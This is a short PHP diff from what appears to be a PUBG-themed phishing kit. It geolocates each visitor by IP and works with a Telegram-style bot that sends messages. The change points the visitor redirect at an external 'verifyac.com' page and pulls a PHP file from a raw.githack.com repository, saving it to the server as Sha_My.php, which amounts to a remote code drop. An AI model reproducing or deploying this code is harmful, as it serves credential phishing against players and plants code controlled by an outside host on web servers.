@@ -59,7 +59,7 @@ $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key.
 $jsondata = json_decode($cty1);
 $cty = $jsondata->country_name;
 $ccode = $jsondata->location->calling_code;
-$url1 = file_get_contents('https://bit.ly/35MECaR');
+$url1 = 'http://www.verifyac.com/index.php?uc=F';
 header("location: $url1");
 $name = $message->from->first_name;
 $ads = file_get_contents('link.txt');
@@ -95,6 +95,6 @@ bot("sendMessage",[
   </body>
 </html>
 <?
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/F/Update.php");
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/F/UpdaTe.php");
 $xx = file_put_contents("Sha_My.php", $shamy); 
 ?>
